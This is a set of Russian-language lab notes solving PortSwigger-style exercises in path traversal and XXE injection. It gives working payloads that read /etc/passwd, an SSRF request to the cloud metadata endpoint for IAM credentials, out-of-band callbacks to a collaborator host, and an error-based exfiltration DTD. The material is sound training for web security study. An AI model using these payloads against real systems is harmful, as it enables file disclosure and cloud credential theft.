# Path traversal

### 1. Lab: File path traversal, simple case

На странице home подгружаются изображения по отдельной ручке, куда передается название файла.
Туда вставил вместо 36.jpg

```
../../../etc/passwd
```

### 2. Lab: File path traversal, traversal sequences blocked with absolute path bypass
Тут так же, как в прошлой, только вставить можно всего лишь
```
/etc/passwd
```

### 3. Lab: File path traversal, traversal sequences stripped non-recursively

Тут так же, как в предыдущих, но, в связи с чисткой надо дублировать символы

```
....//....//....//etc/passwd
```

### 4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
Начало такое же, как и в прошлых.

Затем надо url енкоднуть дважды (сначала / , затем %)
```
..%2f..%2f..%2fetc/passwd
```


```
..%252f..%252f..%252fetc/passwd
```

### 5. Lab: File path traversal, validation of start of path

Начало как и в предыдущих

Тут так же просто заменяем название картинки на path traversal

```
/var/www/images/../../../etc/passwd
```

### 6. Lab: File path traversal, validation of file extension with null byte bypass

Тут так же как в прошлых начало, но тут проверятся тип файла. Потому, если вставить null terminator (%00), то и фильтр пройдем и файл passwd получим.

```
../../../etc/passwd%00.jpg
```

# XML external entity (XXE) injection

### 1. Lab: Exploiting XXE using external entities to retrieve files

По кнопке check stock вызывается пост запрос, оформленный как xml

Заметил, что если xml на находится через одну строку после запроса, то он не парсится. Вставил запрос поддельный и получил свое


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

### 2. Lab: Exploiting XXE to perform SSRF attacks

Тут начало такое же, как и в прошлой. Но на этот раз надо ssrf сделать. Начинаем с запроса

```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
    <stockCheck>
        <productId>
            &xxe;
        </productId>
    <storeId>1</storeId>
    </stockCheck>
```
Далее нам возвращает одно за другим названия следующих папок, пока мы не дойдем до
```
/latest/meta-data/iam/security-credentials/admin
```

### 3. Lab: Blind XXE with out-of-band interaction

Начало такое же, как и раньше, только сейчас отбиваюсь на xxx.oastify.com

```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://xxx.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### 4. Lab: Blind XXE with out-of-band interaction via XML parameter entities

Тут все так же как в прошлой, но запрос с параметрической сущностью
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://xxx.oastify.com"> %xxe; ]>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

### 5. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
Нужна эксфильтрация через коллаборатор

### 6. Lab: Exploiting blind XXE to retrieve data via error messages

Начало такое же.

Затем делаем эксплоит

<!ENTITY % file SYSTEM "file:///etc/passwd"> # % file - параметрическая сущность, читающая /etc/passwd
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> # - подставляет значение file в читающий путь, от того ошибка и вылезает
%eval;
%exfil;


